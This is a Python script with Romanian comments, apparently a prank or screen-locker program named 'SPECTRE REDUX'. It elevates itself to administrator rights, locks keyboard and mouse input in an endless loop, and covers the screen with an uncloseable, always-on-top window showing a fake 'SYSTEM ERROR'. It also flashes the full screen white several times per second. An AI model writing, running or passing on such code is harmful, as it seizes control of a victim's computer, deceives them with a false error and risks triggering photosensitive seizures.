#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SPECTRE REDUX - Blipuri ALB, DENSE, PUTERNICE
Ecran roșu + blipuri albe rapide + tastatură blocată
"""

import tkinter as tk
import threading
import time
import ctypes
import sys
import os
import random

# Auto-admin
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

# Blocare tastatură
def block_keys():
    while True:
        try:
            ctypes.windll.user32.BlockInput(True)
            time.sleep(0.05)
        except:
            pass

threading.Thread(target=block_keys, daemon=True).start()

# Creare fereastră
root = tk.Tk()

# Setări fullscreen
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)

w = root.winfo_screenwidth()
h = root.winfo_screenheight()
root.geometry(f"{w}x{h}+0+0")

# Fundal roșu
root.configure(background="red")

# Prevenim închiderea
root.bind("<Escape>", lambda e: None)
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Text
label = tk.Label(root, text="⚠️ SYSTEM ERROR ⚠️", font=("Arial", 60, "bold"), fg="white", bg="red")
label.pack(expand=True)

# Adăugăm un al doilea text pentru efect
label2 = tk.Label(root, text="CRITICAL FAILURE", font=("Arial", 30), fg="white", bg="red")
label2.pack()

# ===== BLIPURI ALB, DENSE, PUTERNICE =====
blip_active = True
blip_count = 0

def alb_puternic():
    """Blip ALB extrem de puternic"""
    if blip_active:
        # Fundal ALB PUR
        root.configure(background="white")
        label.config(bg="white", fg="red")
        label2.config(bg="white", fg="red")
        
        # Revine la roșu după FOARTE PUȚIN timp
        root.after(30, inapoi_rosu)  # 30 milisecunde = BLIP FOARTE SCURT
        
        # Programează următorul blip
        interval = random.randint(150, 400)  # Între 0.15 și 0.4 secunde
        root.after(interval, alb_puternic)

def inapoi_rosu():
    """Revine la roșu"""
    root.configure(background="red")
    label.config(bg="red", fg="white")
    label2.config(bg="red", fg="white")

# Pornește blipurile după 1 secundă
root.after(1000, alb_puternic)

root.mainloop()